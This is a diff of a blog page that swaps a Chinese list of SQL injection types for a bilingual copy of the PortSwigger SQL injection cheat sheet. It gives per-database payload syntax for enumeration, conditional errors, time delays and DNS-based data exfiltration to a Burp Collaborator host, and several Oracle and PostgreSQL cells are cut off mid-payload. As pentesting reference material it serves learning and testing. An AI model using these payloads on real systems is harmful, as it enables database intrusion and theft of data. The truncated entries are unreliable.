@@ -1947,7 +1947,7 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/Sqli-注入的分类/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/Sqli-SQL injection cheat sheet/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Foolisheddy">
@@ -1966,7 +1966,7 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2019/05/01/Sqli-注入的分类/" itemprop="url">Sqli-注入的分类</a></h1>
+                <a class="post-title-link" href="/2019/05/01/Sqli-SQL injection cheat sheet/" itemprop="url">SQL injection cheat sheet</a></h1>
         
 
         <div class="post-meta">
@@ -2040,30 +2040,282 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
       
         
           
-            <h1 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h1><ul>
-<li>基于错误的SQL注入</li>
-<li>联合查询的类型</li>
-<li>堆查询注射</li>
-<li>SQL盲注</li>
-<li>基于布尔SQL盲注</li>
-<li>基于时间的SQL盲注</li>
-<li>基于报错的SQL盲注</li>
+            <p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
+<h1 id="String-concatenation-字符串连接"><a href="#String-concatenation-字符串连接" class="headerlink" title="String concatenation 字符串连接"></a>String concatenation 字符串连接</h1><p>You can concatenate together multiple strings to make a single string.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left">`’foo’</td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>&#39;foo&#39;+&#39;bar&#39;</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left">`’foo’</td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>&#39;foo&#39; &#39;bar&#39; [Note the space between the two strings]</code> <br> <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Comments-注释"><a href="#Comments-注释" class="headerlink" title="Comments 注释"></a>Comments 注释</h1><p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>--comment</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>#comment</code> <br><code>-- comment [Note the space after the double dash]</code> <br><code>/*comment*/</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Database-version-数据库版本"><a href="#Database-version-数据库版本" class="headerlink" title="Database version 数据库版本"></a>Database version 数据库版本</h1><p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>SELECT banner FROM v$version</code> <br><code>SELECT version FROM v$instance</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>SELECT @@version</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>SELECT version()</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>SELECT @@version</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Database-contents-数据库内容"><a href="#Database-contents-数据库内容" class="headerlink" title="Database contents 数据库内容"></a>Database contents 数据库内容</h1><p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Conditional-errors-条件错误"><a href="#Conditional-errors-条件错误" class="headerlink" title="Conditional errors 条件错误"></a>Conditional errors 条件错误</h1><p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Batched-or-stacked-queries-批量查询"><a href="#Batched-or-stacked-queries-批量查询" class="headerlink" title="Batched (or stacked) queries 批量查询"></a>Batched (or stacked) queries 批量查询</h1><p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>Does not support batched queries.</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>Does not support batched queries.</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Time-delays-时间延迟"><a href="#Time-delays-时间延迟" class="headerlink" title="Time delays 时间延迟"></a>Time delays 时间延迟</h1><p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left"><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>SELECT pg_sleep(10)</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>SELECT sleep(10)</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="Conditional-time-delays-有条件的时间延迟"><a href="#Conditional-time-delays-有条件的时间延迟" class="headerlink" title="Conditional time delays 有条件的时间延迟"></a>Conditional time delays 有条件的时间延迟</h1><p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left">`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN ‘a’</td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,sleep(10),&#39;a&#39;)</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="DNS-lookup-DNS查询"><a href="#DNS-lookup-DNS查询" class="headerlink" title="DNS lookup DNS查询"></a>DNS lookup DNS查询</h1><p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left">The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<code>SELECT extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code><br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<code>SELECT UTL_INADDR.get_host_address(&#39;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;)</code></td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>exec master..xp_dirtree &#39;//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&#39;</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left"><code>copy (SELECT &#39;&#39;) to program &#39;nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;</code></td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left">The following techniques work on Windows only:<br><code>LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)</code><br><code>SELECT ... INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找"><a href="#DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找" class="headerlink" title="DNS lookup with data exfiltration 使用数据泄露进行DNS查找"></a>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</h1><p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
+<table>
+<thead>
+<tr>
+<th align="left">database</th>
+<th align="left">example</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Oracle</td>
+<td align="left">`SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?>&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM “http://‘</td>
+</tr>
+<tr>
+<td align="left">Microsoft</td>
+<td align="left"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&#39;)</code></td>
+</tr>
+<tr>
+<td align="left">PostgreSQL</td>
+<td align="left">create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := ‘copy (SELECT ‘’’’) to program ‘’nslookup ‘</td>
+</tr>
+<tr>
+<td align="left">MySQL</td>
+<td align="left">The following technique works on Windows only:<code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>SQL注入在不同数据库的表现,可表现在这些方面:</p>
+<ul>
+<li>String concatenation 字符串连接</li>
+<li>Comments 注释</li>
+<li>Database version 数据库版本的查询</li>
+<li>Database contents 数据库内容的查询</li>
+<li>Conditional errors 条件错误</li>
+<li>Batched (or stacked) queries 批量查询</li>
+<li>Time delays 时间延迟</li>
+<li>Conditional time delays 有条件的时间延迟</li>
+<li>DNS lookup DNS查询<br>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</li>
 </ul>
-<h1 id="基于如何处理输入的SQL查询-数据类型"><a href="#基于如何处理输入的SQL查询-数据类型" class="headerlink" title="基于如何处理输入的SQL查询(数据类型)"></a>基于如何处理输入的SQL查询(数据类型)</h1><ul>
-<li>基于字符串</li>
-<li>数字或整数为基础</li>
-</ul>
-<h1 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h1><ul>
-<li><p>一阶注射</p>
-</li>
-<li><p>二阶注射</p>
-</li>
-</ul>
-<p>一阶注射是指输入的注射语句对WEB直接产生了影响，出现了结果；二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其它的辅助间接的对WEB产生危害，这样的就被称为是二阶注入.</p>
-<h1 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h1><ul>
-<li>通过用户输入的表单域的注射</li>
-<li>通过cookie注射</li>
-<li>通过服务器变量注射(基于头部信息的注射)</li>
+<hr>
+<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
+<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">SQL injection cheat sheet</a></li>
 </ul>
 
           
